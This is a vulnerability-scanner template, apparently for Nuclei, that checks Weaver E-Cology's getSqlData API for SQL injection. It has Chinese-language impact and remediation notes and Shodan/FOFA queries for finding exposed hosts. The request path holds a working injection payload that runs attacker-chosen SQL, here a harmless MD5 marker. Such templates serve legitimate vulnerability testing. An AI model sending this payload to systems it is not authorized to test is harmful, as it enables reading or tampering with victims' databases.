id: weaver-ecology-getsqldata-sqli

info:
  name: Weaver E-Cology `getsqldata` - SQL 注入漏洞
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 Weaver E-Cology `getsqldata` - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会向 `/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashby...`、`/Api/portal/elementEcodeAddon/getSqlData?sql=` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46
  classification:
    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    shodan-query: ecology_JSessionid
    fofa-query: app="泛微-协同办公OA"
    product: e-cology
    vendor: weaver
  tags: ecology,weaver,oa,sqli,vuln

variables:
  num: "999999999"

http:
  - method: GET
    path:
      - "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{num}}')),3,32)"
      - "{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql="

    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - '{{md5(num)}}'

      - type: word
        part: body
        words:
          - '{"api_status":'
          - '"status":true}'
        condition: and
